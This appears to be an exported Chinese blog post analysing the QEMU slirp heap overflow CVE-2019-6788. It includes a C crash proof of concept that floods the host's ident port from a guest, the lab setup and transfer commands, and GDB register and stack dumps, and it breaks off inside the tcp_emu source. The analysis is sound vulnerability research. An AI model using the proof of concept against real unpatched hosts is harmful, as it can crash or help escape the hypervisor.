
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <!-- common.css -->
      <style>* {-webkit-tap-highlight-color: rgba(0,0,0,0);}html {-webkit-text-size-adjust: none;}body {font-family: -apple-system, Helvetica, Arial, sans-serif;margin: 0;padding: 20px;color: #333;word-wrap: break-word;}h1, h2, h3, h4, h5, h6 {line-height: 1.1;}img {max-width: 100% !important;height: auto;}blockquote {margin: 0;padding: 0 15px;color: #777;border-left: 4px solid #ddd;}hr {background-color: #ddd;border: 0;height: 1px;margin: 15px 0;}code {font-family: Menlo, Consolas, 'Ubuntu Mono', Monaco, 'source-code-pro', monospace;line-height: 1.4;margin: 0;padding: 0.2em 0;font-size: 90%;background-color: rgba(0,0,0,0.04);border-radius: 3px;}pre > code {margin: 0;padding: 0;font-size: 100%;word-break: normal;background: transparent;border: 0;}ol {list-style-type: decimal;}ol ol, ul ol {list-style-type: lower-latin;}ol ol ol, ul ol ol, ul ul ol, ol ul ol {list-style-type: lower-roman;}table {border-spacing: 0;border-collapse: collapse;margin-top: 0;margin-bottom: 16px;}table th {font-weight: bold;}table th, table td {padding: 6px 13px;border: 1px solid #ddd;}table tr {border-top: 1px solid #ccc;}table tr:nth-child(even) {background-color: #f8f8f8;}input[type="checkbox"] {cursor: default;margin-right: 0.5em;font-size: 13px;}.task-list-item {list-style-type: none;}.task-list-item+.task-list-item {margin-top: 3px;}.task-list-item input {float: left;margin: 0.3em 1em 0.25em -1.6em;vertical-align: middle;}#tag-field {margin: 8px 2px 10px;}#tag-field .tag {display: inline-block;background: #cadff3;border-radius: 4px;padding: 1px 8px;color: black;font-size: 12px;margin-right: 10px;line-height: 1.4;}</style>
      <!-- ace-static.css -->
      <style>.ace_static_highlight {white-space: pre-wrap;}.ace_static_highlight .ace_gutter {width: 2em;text-align: right;padding: 0 3px 0 0;margin-right: 3px;}.ace_static_highlight.ace_show_gutter > .ace_line {padding-left: 2.6em;}.ace_static_highlight .ace_line {position: relative;}.ace_static_highlight .ace_gutter-cell {-moz-user-select: -moz-none;-khtml-user-select: none;-webkit-user-select: none;user-select: none;top: 0;bottom: 0;left: 0;position: absolute;}.ace_static_highlight .ace_gutter-cell:before {content: counter(ace_line, decimal);counter-increment: ace_line;}.ace_static_highlight {counter-reset: ace_line;}</style>
      <style>.ace-tomorrow-night-eighties .ace_gutter {background: #272727;color: #CCC}.ace-tomorrow-night-eighties .ace_print-margin {width: 1px;background: #272727}.ace-tomorrow-night-eighties {background-color: #2D2D2D;color: #CCCCCC}.ace-tomorrow-night-eighties .ace_constant.ace_other,.ace-tomorrow-night-eighties .ace_cursor {color: #CCCCCC}.ace-tomorrow-night-eighties .ace_marker-layer .ace_selection {background: #515151}.ace-tomorrow-night-eighties.ace_multiselect .ace_selection.ace_start {box-shadow: 0 0 3px 0px #2D2D2D;}.ace-tomorrow-night-eighties .ace_marker-layer .ace_step {background: rgb(102, 82, 0)}.ace-tomorrow-night-eighties .ace_marker-layer .ace_bracket {margin: -1px 0 0 -1px;border: 1px solid #6A6A6A}.ace-tomorrow-night-bright .ace_stack {background: rgb(66, 90, 44)}.ace-tomorrow-night-eighties .ace_marker-layer .ace_active-line {background: #393939}.ace-tomorrow-night-eighties .ace_gutter-active-line {background-color: #393939}.ace-tomorrow-night-eighties .ace_marker-layer .ace_selected-word {border: 1px solid #515151}.ace-tomorrow-night-eighties .ace_invisible {color: #6A6A6A}.ace-tomorrow-night-eighties .ace_keyword,.ace-tomorrow-night-eighties .ace_meta,.ace-tomorrow-night-eighties .ace_storage,.ace-tomorrow-night-eighties .ace_storage.ace_type,.ace-tomorrow-night-eighties .ace_support.ace_type {color: #CC99CC}.ace-tomorrow-night-eighties .ace_keyword.ace_operator {color: #66CCCC}.ace-tomorrow-night-eighties .ace_constant.ace_character,.ace-tomorrow-night-eighties .ace_constant.ace_language,.ace-tomorrow-night-eighties .ace_constant.ace_numeric,.ace-tomorrow-night-eighties .ace_keyword.ace_other.ace_unit,.ace-tomorrow-night-eighties .ace_support.ace_constant,.ace-tomorrow-night-eighties .ace_variable.ace_parameter {color: #F99157}.ace-tomorrow-night-eighties .ace_invalid {color: #CDCDCD;background-color: #F2777A}.ace-tomorrow-night-eighties .ace_invalid.ace_deprecated {color: #CDCDCD;background-color: #CC99CC}.ace-tomorrow-night-eighties .ace_fold {background-color: #6699CC;border-color: #CCCCCC}.ace-tomorrow-night-eighties .ace_entity.ace_name.ace_function,.ace-tomorrow-night-eighties .ace_support.ace_function,.ace-tomorrow-night-eighties .ace_variable {color: #6699CC}.ace-tomorrow-night-eighties .ace_support.ace_class,.ace-tomorrow-night-eighties .ace_support.ace_type {color: #FFCC66}.ace-tomorrow-night-eighties .ace_heading,.ace-tomorrow-night-eighties .ace_markup.ace_heading,.ace-tomorrow-night-eighties .ace_string {color: #99CC99}.ace-tomorrow-night-eighties .ace_comment {color: #999999}.ace-tomorrow-night-eighties .ace_entity.ace_name.ace_tag,.ace-tomorrow-night-eighties .ace_entity.ace_other.ace_attribute-name,.ace-tomorrow-night-eighties .ace_meta.ace_tag,.ace-tomorrow-night-eighties .ace_variable {color: #F2777A}.ace-tomorrow-night-eighties .ace_indent-guide {background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAYAAACZgbYnAAAAEklEQVQImWPQ09NrYAgMjP4PAAtGAwchHMyAAAAAAElFTkSuQmCC) right repeat-y}</style>
      <!-- export.css -->
      <style>
        body{margin:0 auto;max-width:800px;line-height:1.4}
        #nav{margin:5px 0 10px;font-size:15px}
        #titlearea{border-bottom:1px solid #ccc;font-size:17px;padding:10px 0;}
        #contentarea{font-size:15px;margin:16px 0}
        .cell{outline:0;min-height:20px;margin:5px 0;padding:5px 0;}
        .code-cell{font-family:Menlo,Consolas,'Ubuntu Mono',Monaco,'source-code-pro',monospace;font-size:12px;}
        .latex-cell{white-space:pre-wrap;}
      </style>
      <!-- User CSS -->
      <style> .text-cell {font-size: 15px;}.code-cell {font-size: 12px;}.markdown-cell {font-size: 15px;}.latex-cell {font-size: 15px;}</style>
    </head>
    <body>
      
      <div id="titlearea">
        <h2>大土豆安全笔记 | 2020.04.04</h2>
      </div>
      <div id="contentarea"><div class="cell markdown-cell"><p><img src="resources/3FBA4E859C757FAF922E010415207FEF.jpg" alt="roi-dimor-qCxN0_piuHc-unsplash.jpg" width="4725" height="3150"></p>
<p><strong>都是放假给闲的</strong></p>
<p>今天仔细把QEMU逃逸漏洞CVE-2019-6788的细节描述一下</p>
<p>搭建环境不多说了，大家可以参考《qemu-pwn cve-2019-6788堆溢出漏洞分析》</p>
<ul>
<li><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788堆溢出漏洞分析</a></li>
</ul>
<p>使用GDB调试启动QEMU虚拟机</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>file ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>run -kernel ./Kernel/linux-5.2.11/arch/x86/boot/bzImage -append "console=ttyS0 root=/dev/sda rw" -hda ./rootfs.img -m 2G -nographic -L ./pc-bios -smp 1 -net user,hostfwd=tcp::6788-:22 -net nic
</div></div></div></pre>
<p>Poc如下</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;stdio.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;unistd.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;stdlib.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;string.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;netdb.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;arpa/inet.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#include &lt;sys/socket.h&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>int main() {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    int s, ret;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    struct sockaddr_in ip_addr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    char buf[0x500];
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    s = socket(AF_INET, SOCK_STREAM, 0);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ip_addr.sin_family = AF_INET;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2"); // host IP
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ip_addr.sin_port = htons(113);                   // vulnerable port
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ret = connect(s, (struct sockaddr *)&amp;ip_addr, sizeof(struct sockaddr_in));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    memset(buf, 'A', 0x500);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    while (1) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    write(s, buf, 0x500);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    return 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>在宿主机编译</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>wnagzihxa1n@Qemu:~/CVE-2019-6788/qemu-vm-escape$ gcc -o crash_poc crash_poc.c
</div></div></div></pre>
<p>将Poc传递到QEMU有很多种方法，我这里使用最简单的一种，宿主机开启一个Web服务</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>wnagzihxa1n@Qemu:~/CVE-2019-6788/qemu-vm-escape$ python -m SimpleHTTPServer
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Serving HTTP on 0.0.0.0 port 8000 ...
</div></div></div></pre>
<p>然后QEMU虚拟机<code>wget</code>获取即可</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>root@ubuntu:~# wget 10.0.2.2:8000/crash_poc
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>--2020-04-02 03:44:21--  http://10.0.2.2:8000/crash_poc
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Connecting to 10.0.2.2:8000... connected.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>HTTP request sent, awaiting response... 200 OK
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Length: 8872 (8.7K) [application/octet-stream]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Saving to: 'crash_poc'
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>crash_poc           100%[===================&gt;]   8.66K  --.-KB/s    in 0.004s  
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>2020-04-02 03:44:21 (2.00 MB/s) - 'crash_poc' saved [8872/8872]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>root@ubuntu:~# chmod 777 crash_poc
</div></div></div></pre>
<p>Web服务监控到文件传输</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Serving HTTP on 0.0.0.0 port 8000 ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>127.0.0.1 - - [02/Apr/2020 11:44:21] "GET /crash_poc HTTP/1.1" 200 -
</div></div></div></pre>
<p>此时QEMU虚拟机环境已经准备好，我们在宿主机开启端口监听</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>wnagzihxa1n@Qemu:~/CVE-2019-6788$ sudo nc -lvnp 113
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>[sudo] password for wnagzihxa1n: 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Listening on [0.0.0.0] (family 0, port 113)
</div></div></div></pre>
<p>执行Poc，宿主机成功收到数据</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Listening on [0.0.0.0] (family 0, port 113)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Connection from [127.0.0.1] port 113 [tcp/*] accepted (family 2, sport 45840)
</div></div></div></pre>
<p>同时可以捕获到崩溃</p>
<p><img src="resources/2A8191B3ABAFFB7D97F0C56A234DF693.jpg" alt="IMAGE" width="1920" height="1080"></p>
<p>如果使用断点，断点现场如下</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>file ./qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>b tcp_emu
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>run -kernel ./Kernel/linux-5.2.11/arch/x86/boot/bzImage -append "console=ttyS0 root=/dev/sda rw" -hda ./rootfs.img -m 2G -nographic -L ./pc-bios -smp 1 -net user,hostfwd=tcp::6788-:22 -net nic
</div></div></div></pre>
<p><img src="resources/EDF9EF37CB1D21AFB02E050C1E89AC7B.jpg" alt="IMAGE" width="1920" height="1080"></p>
<p>调用栈</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► f 0     555555c14552 tcp_emu+28
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 1     555555c10a2f tcp_input+3186
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 2     555555c077e5 ip_input+710
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 3     555555c0ac85 slirp_input+412
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 4     555555bf2f80 net_slirp_receive+83
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 5     555555be8a36 nc_sendv_compat+254
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 6     555555be8af8 qemu_deliver_packet_iov+172
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 7     555555beb5d5 qemu_net_queue_deliver_iov+80
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 8     555555beb744 qemu_net_queue_send_iov+134
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 9     555555be8c3d qemu_sendv_packet_async+289
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 10     555555be8c6a qemu_sendv_packet+43
</div></div></div></pre>
<p>根据大佬们的文章，在函数<code>tcp_emu()</code>下断点，我们来看断点现场</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>root@ubuntu:~# ./crash_poc 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>[Switching to Thread 0x7fffd5480700 (LWP 6110)]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Thread 4 "qemu-system-x86" hit Breakpoint 1, tcp_emu (so=0x7fffd29be200, m=0x5555579f1d00) at /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c:612
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>612 {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RAX  0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RBX  0x7fffd2a10110 ◂— 0x7fffd2a10110
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RCX  0x2238
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RDX  0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 —▸ 0x55555682e068 ◂— ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RDI  0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RSI  0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 —▸ 0x55555682e068 ◂— ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R8   0x5555579f1d7e ◂— 0x6000202
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R9   0x0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R10  0x5555579f1d7e ◂— 0x6000202
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R11  0x2
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R12  0x5555579f1d70 ◂— 0x0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R13  0x18
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R14  0x55555684c6d0 ◂— 0xffffb20740523818
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> R15  0x0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RBP  0x7fffd547e950 —▸ 0x7fffd547eba0 —▸ 0x7fffd547ebf0 —▸ 0x7fffd547ec30 —▸ 0x7fffd547ec80 ◂— ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RSP  0x7fffd547e7c0 —▸ 0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 ◂— ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> RIP  0x555555c14552 (tcp_emu+28) ◂— mov    rax, qword ptr fs:[0x28]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>──────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 0x555555c14552 &lt;tcp_emu+28&gt;    mov    rax, qword ptr fs:[0x28]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c1455b &lt;tcp_emu+37&gt;    mov    qword ptr [rbp - 0x18], rax
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c1455f &lt;tcp_emu+41&gt;    xor    eax, eax
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14561 &lt;tcp_emu+43&gt;    mov    rax, qword ptr [rbp - 0x188]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14568 &lt;tcp_emu+50&gt;    mov    rax, qword ptr [rax + 0x18]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c1456c &lt;tcp_emu+54&gt;    mov    qword ptr [rbp - 0x140], rax
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14573 &lt;tcp_emu+61&gt;    mov    rax, qword ptr [rbp - 0x188]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c1457a &lt;tcp_emu+68&gt;    movzx  eax, byte ptr [rax + 0x139]
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14581 &lt;tcp_emu+75&gt;    movzx  eax, al
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14584 &lt;tcp_emu+78&gt;    cmp    eax, 7
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   0x555555c14587 &lt;tcp_emu+81&gt;    ja     tcp_emu+4533 &lt;0x555555c156eb&gt;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>──────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>In file: /home/wnagzihxa1n/CVE-2019-6788/qemu/slirp/tcp_subr.c
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   607  *
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   608  * NOTE: if you return 0 you MUST m_free() the mbuf!
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   609  */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   610 int
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   611 tcp_emu(struct socket *so, struct mbuf *m)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► 612 {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   613  Slirp *slirp = so-&gt;slirp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   614  u_int n1, n2, n3, n4, n5, n6;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   615         char buff[257];
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   616  uint32_t laddr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   617  u_int lport;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>──────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>00:0000│ rsp  0x7fffd547e7c0 —▸ 0x5555579f1d00 —▸ 0x5555579ff000 —▸ 0x7fffd24b5200 —▸ 0x7fffd23cbbd0 ◂— ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>01:0008│      0x7fffd547e7c8 —▸ 0x7fffd29be200 —▸ 0x555556830220 —▸ 0x55555682e170 ◂— 0x7fffd29be200
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>02:0010│      0x7fffd547e7d0 —▸ 0x7fffd547e9f0 —▸ 0x7fffd547ea60 ◂— 0xf02000afccf0002
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>03:0018│      0x7fffd547e7d8 ◂— 0x1
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>04:0020│      0x7fffd547e7e0 —▸ 0x555556829990 —▸ 0x5555566deb40 (net_hub_port_info) ◂— 0x8
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>05:0028│      0x7fffd547e7e8 —▸ 0x5555576ac4e0 —▸ 0x5555576ac360 —▸ 0x555556651ec0 (net_e1000_info) ◂— 0x1
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>06:0030│      0x7fffd547e7f0 ◂— 0x4620000a312e312e /* '.1.1\n' */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>07:0038│      0x7fffd547e7f8 ◂— 0x40 /* '@' */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span> ► f 0     555555c14552 tcp_emu+28
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 1     555555c10a2f tcp_input+3186
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 2     555555c077e5 ip_input+710
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 3     555555c0ac85 slirp_input+412
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 4     555555bf2f80 net_slirp_receive+83
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 5     555555be8a36 nc_sendv_compat+254
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 6     555555be8af8 qemu_deliver_packet_iov+172
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 7     555555beb5d5 qemu_net_queue_deliver_iov+80
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 8     555555beb744 qemu_net_queue_send_iov+134
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 9     555555be8c3d qemu_sendv_packet_async+289
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>   f 10     555555be8c6a qemu_sendv_packet+43
</div></div></div></pre>
<p>对应的函数如下，我简单做了一些改动，但是函数逻辑没变化</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>int tcp_emu(struct socket *so, struct mbuf *m)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>{
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    Slirp *slirp = so-&gt;slirp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    u_int n1, n2, n3, n4, n5, n6;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    switch(so-&gt;so_emu) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    int x, i;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>        case EMU_IDENT:
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>            /*
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>             * Identification protocol as per rfc-1413
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>             */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>            {
